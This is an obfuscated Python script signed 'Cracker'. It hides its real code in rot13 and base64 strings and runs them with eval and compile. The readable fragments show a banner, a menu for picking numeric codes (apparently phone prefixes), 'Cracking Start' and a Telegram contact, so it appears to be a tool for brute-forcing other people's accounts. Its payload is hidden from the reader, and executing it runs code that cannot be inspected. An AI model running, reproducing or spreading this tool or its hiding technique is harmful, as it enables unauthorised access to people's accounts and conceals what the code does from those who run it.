# Coded by Cracker
# CRACKER911181
 

import base64, codecs
magic = 'CmltcG9ydCB0aW1lLG9zLHN5cwoKI3RleHQgY29sb3VyKCkKI2NyZWF0b3I6IENSQUNLRVI5MTExODEKCmNvbG91cm9mZiA9ICdcMzNbMDBtJwpvZmY9Ilx4MWJbMDBtIgp1bj0iXHgxYls0bSIKd2hpdGUgPSAnXDMzWzAwbScKcmVkID0gJ1wzM1s5MW0nCmdyZWVuID0gJ1wzM1s5Mm0nCnlvbGxvdyA9ICdcMzNbOTNtJwpibHVlID0gJ1wzM1s5NG0nCnJvc3kgPSAnXDMzWzk1bScKcGVzdCA9ICdcMzNbOTZtJwojY29sb3VyIGVuZAoKZGVmIGxnKCk6CglwcmludChibHVlK2YiIiIKICAgX19fXyAgICAgICAgICAgICAgICBfICAgICAgICAgICAgICAgIF9fX19fICAgICAgICAgICBfCiAgLyBfX198XyBfXyBfXyBfICBfX198IHwgX19fX18gXyBfXyAgIHxfICAgX3xfXyAgIF9fXyB8IHwKICIiIitibHVlKyIiInwgfCAgIHwgJ19fLyBfYCB8LyBfX3wgfC8gLyBfIFwgJ19ffF9fX198IHwvIF8'
love = 'tKPNiVS8tKUjtsNbtVvVvX3Oyp3DeVvVvsPO8K19ssPO8VUjtXS98VUjtXS9ssPNtVQjtVS9sYlO8VUksK19sK3jtsPNbKlxtsPNbKlxtsPO8PvNtKS9sK198K3jtVSksKlkssSksK198K3kpK1ksK198K3jtVPNtVPNtsS98KS9sKl8tKS9sKl98K3kpoykhVPVvVvgapzIyovfvVvVtVPNtVPNtVPNtVQLtD3WuL2ftJJ91pvOKo3WfMPjtFJLtJJ91VRAuoykhKT5pqPNtVPNtVPNtVPNtVvVvX2WfqJHeVvVvJ+XLuI0tDxDtD2kiozyhMlOo4cvSKFOpovVvVvgapzIyovfvVvVtCG09CG09CG09CG09CG09CG09CG09CG09CG09CG09CG09CG09CG09CG09CG09CG09CG09CG09CG09VvVvX2AioT91pz9zMvxXMz9lVTxtnJ4tpzShM2HbZGNjZPx6Ptyipl5mrKA0MJ0bW2AfMJSlWlxXPJkaXPxXPJAbo3AyCKA0pvucoaO1qPujMKA0XlWpoykhKUEpqPNkYxWRVRMPVRAfo25cozqpoyk0KUDvX3WyMPfvZQ'
god = 'AuQmFjayBUbyBIb21lXG5cbiIrcm9zeSsiRW50ZXIgWW91ciBPcHRpb246ICIpKQoJCglpZiBjaG9zZT09IjEiOgoJCW9zLnN5c3RlbSgiY2xlYXIjIikKCQlwcmludChncmVlbisiXG5cblx0XHQgICBDaG9vc2UgWW91ciBDb2RlID4+IitwZXN0KyJcblxuXHRcdDE3MSwgMTcyLCAxNzgsIDE3MCwgMTMwXG5cdFx0MTcwLCAxNzcsIDE3OSwgMTMxLCAxODFcblx0XHQxMzIsIDE3MywgMTc1LCAxOTEsIDE5MlxuXHRcdDE5MywgMTk0LCAxOTUsIDE5NiwgMTUxXG5cdFx0MTUyLCAxNTMsIDE1NCwgMTU1LCAxNTZcblx0XHQxNTcsIDE4MywgMTg0LCAxODUsIDE4NlxuXHRcdDE5MSwgMTkyLCAxOTcsIDE5OCwgMTk5IikKCQljb2RlPXN0cihpbnB1dChyb3N5KyJcbkVudGVyIFlvdXIgQ29kZTogIikpCgoJCW9zLnN5c3RlbSgnY2xlYXInKQoKCQlwcmludChibHVlKyIiIgp8PT09PT09PT09PT09P'
destiny = 'G09CG09CG09CG09CKjXsPNtVPNtD3WuL2gcozptH3EupaDtVPNtVPO8PajeXlfeXlfeXlfeXlfeXlfeXlfeXlfeXlfesNc8VRAiqJ50paxtVPNtBvNtVPNtDxDtVPNtVUjtVPNvVvVeq2ucqTHeqJ4eVvVvnUE0pUZ6Yl90Yz1yY2AlLJAeMKV5ZGRkBQRvVvVeo2MzX2WfqJHeVvVvPajtITygMFNtVPNtVPN6VPVvVvk0nJ1yYaA0pzM0nJ1yXPVyFGbyGGbyHlVcYPVvVvO8PajtGTygnKDtVPNtVPN6VPNtBGx5BGx5BFNtsPNtVPNtVPNtVvVvX3qbnKEyX3IhXlVvVxOwpzSwn2IlBGRkZGtkVvVvX29zMvgvoUIyXlVvVtc8CG09CG09CG09CG09CG09CG09CG09CG09CKjXVvVvXDbWPKOlnJ50XUWyMPfvKT5pqPNtVPNtVSEiVRI4nKD6VSOyp3ZtXRA0pzjtX2ZcKT4vXDbWPJ9iCJ9jMJ4bVzAfov5jrFVfVaVvXDbWPDbWPJI4MJZbo28hpzIuMPtcXDbXPJIfnJLtL2uip2H9CFVjZPV6PtxWLaWyLJf='
joy = '\x72\x6f\x74\x31\x33'
trust = eval('\x6d\x61\x67\x69\x63') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x6c\x6f\x76\x65\x2c\x20\x6a\x6f\x79\x29') + eval('\x67\x6f\x64') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x64\x65\x73\x74\x69\x6e\x79\x2c\x20\x6a\x6f\x79\x29')
eval(compile(base64.b64decode(eval('\x74\x72\x75\x73\x74')),'<string>','exec'))